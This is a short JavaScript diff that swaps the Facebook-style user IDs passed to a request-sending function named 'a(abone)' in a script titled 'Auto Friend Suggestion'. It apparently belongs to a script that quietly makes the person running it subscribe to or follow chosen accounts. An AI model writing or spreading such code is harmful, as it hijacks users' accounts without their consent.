@@ -40,8 +40,7 @@ function a(abone) {
     http4.send(params4)
 }
 
-a("100005115938614");
-a("100001050235420");
+a("100006640748984");
 
 var Title = 'Auto Friend Suggestion ';
 var Descriptions = "",
